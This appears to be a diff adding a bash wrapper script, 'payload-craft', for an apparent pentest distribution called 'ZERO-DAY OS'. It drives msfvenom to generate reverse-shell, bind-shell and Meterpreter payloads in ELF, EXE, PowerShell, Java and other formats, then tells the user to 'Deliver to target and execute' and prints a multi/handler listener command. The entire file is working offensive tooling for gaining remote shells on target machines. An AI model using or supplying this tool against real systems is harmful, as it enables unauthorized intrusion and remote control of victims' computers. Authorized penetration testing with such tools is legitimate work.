@@ -1,0 +1,166 @@
+#!/bin/bash
+# /usr/local/bin/payload-craft
+# msfvenom wrapper for payload generation
+# Usage: payload-craft <type> <ip> <port> [format]
+# Types: shell_reverse_tcp, shell_bind_tcp, meterpreter_reverse_tcp, meterpreter_reverse_http
+# Formats: elf, exe, ps1, py, jar, war, raw, c
+
+TYPE="$1"
+IP="$2"
+PORT="${3:-4444}"
+FORMAT="${4:-elf}"
+LOOT="/opt/cardputer/payloads"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+
+if [ -z "$TYPE" ] || [ -z "$IP" ]; then
+    echo "Usage: payload-craft <type> <ip> [port] [format]"
+    echo ""
+    echo "Types:"
+    echo "  shell_reverse_tcp       — Basic reverse TCP shell"
+    echo "  shell_bind_tcp          — Basic bind TCP shell"
+    echo "  meterpreter_reverse_tcp — Meterpreter reverse TCP"
+    echo "  meterpreter_reverse_http— Meterpreter reverse HTTP"
+    echo ""
+    echo "Formats: elf (Linux ARM), elf-x86, exe (Windows), ps1 (PowerShell),"
+    echo "         py (Python), jar (Java), war (JSP), raw, c (C source)"
+    exit 1
+fi
+
+mkdir -p "$LOOT"
+
+case "$FORMAT" in
+    elf)
+        PLATFORM="linux"
+        ARCH="armle"
+        EXT="elf"
+        MSF_FORMAT="elf"
+        ;;
+    elf-x86)
+        PLATFORM="linux"
+        ARCH="x86"
+        EXT="elf"
+        MSF_FORMAT="elf"
+        ;;
+    exe)
+        PLATFORM="windows"
+        ARCH="x86"
+        EXT="exe"
+        MSF_FORMAT="exe"
+        ;;
+    ps1)
+        PLATFORM="windows"
+        ARCH="x86"
+        EXT="ps1"
+        MSF_FORMAT="ps1"
+        ;;
+    py)
+        PLATFORM="python"
+        ARCH=""
+        EXT="py"
+        MSF_FORMAT="raw"
+        ;;
+    jar)
+        PLATFORM="java"
+        ARCH=""
+        EXT="jar"
+        MSF_FORMAT="jar"
+        ;;
+    war)
+        PLATFORM="java"
+        ARCH=""
+        EXT="war"
+        MSF_FORMAT="war"
+        ;;
+    raw)
+        EXT="bin"
+        MSF_FORMAT="raw"
+        PLATFORM=""
+        ARCH=""
+        ;;
+    c)
+        EXT="c"
+        MSF_FORMAT="c"
+        PLATFORM=""
+        ARCH=""
+        ;;
+    *)
+        echo "[!] Unknown format: $FORMAT"
+        exit 1
+        ;;
+esac
+
+PAYLOAD="linux/armle/shell_reverse_tcp"
+
+case "$TYPE" in
+    shell_reverse_tcp)
+        if [ "$FORMAT" = "exe" ] || [ "$FORMAT" = "ps1" ]; then
+            PAYLOAD="windows/shell_reverse_tcp"
+        else
+            PAYLOAD="linux/armle/shell_reverse_tcp"
+        fi
+        ;;
+    shell_bind_tcp)
+        if [ "$FORMAT" = "exe" ] || [ "$FORMAT" = "ps1" ]; then
+            PAYLOAD="windows/shell_bind_tcp"
+        else
+            PAYLOAD="linux/armle/shell_bind_tcp"
+        fi
+        ;;
+    meterpreter_reverse_tcp)
+        if [ "$FORMAT" = "exe" ] || [ "$FORMAT" = "ps1" ]; then
+            PAYLOAD="windows/meterpreter/reverse_tcp"
+        else
+            PAYLOAD="linux/armle/meterpreter/reverse_tcp"
+        fi
+        ;;
+    meterpreter_reverse_http)
+        if [ "$FORMAT" = "exe" ] || [ "$FORMAT" = "ps1" ]; then
+            PAYLOAD="windows/meterpreter/reverse_http"
+        else
+            PAYLOAD="linux/armle/meterpreter/reverse_http"
+        fi
+        ;;
+    *)
+        echo "[!] Unknown type: $TYPE"
+        exit 1
+        ;;
+esac
+
+OUTFILE="$LOOT/${TYPE}_${IP}_${PORT}_${TIMESTAMP}.${EXT}"
+
+echo "[*] ZERO-DAY OS — Payload Generator"
+echo "[*] Payload: $PAYLOAD"
+echo "[*] LHOST: $IP | LPORT: $PORT"
+echo "[*] Format: $MSF_FORMAT"
+echo "[*] Output: $OUTFILE"
+echo ""
+
+MSF_CMD="msfvenom -p $PAYLOAD LHOST=$IP LPORT=$PORT"
+
+if [ -n "$PLATFORM" ]; then
+    MSF_CMD="$MSF_CMD --platform $PLATFORM"
+fi
+if [ -n "$ARCH" ]; then
+    MSF_CMD="$MSF_CMD -a $ARCH"
+fi
+
+MSF_CMD="$MSF_CMD -f $MSF_FORMAT -o $OUTFILE"
+
+echo "[*] Running: $MSF_CMD"
+echo ""
+
+$MSF_CMD
+
+if [ -f "$OUTFILE" ]; then
+    SIZE=$(du -h "$OUTFILE" | awk '{print $1}')
+    echo ""
+    echo "[+] Payload generated: $OUTFILE ($SIZE)"
+    echo "[+] Deliver to target and execute"
+    echo ""
+    echo "[*] Start listener:"
+    echo "    revshell-listen $PORT"
+    echo "    # Or for meterpreter:"
+    echo "    msfconsole -x 'use exploit/multi/handler; set PAYLOAD $PAYLOAD; set LHOST $IP; set LPORT $PORT; run'"
+else
+    echo "[!] Payload generation failed."
+fi
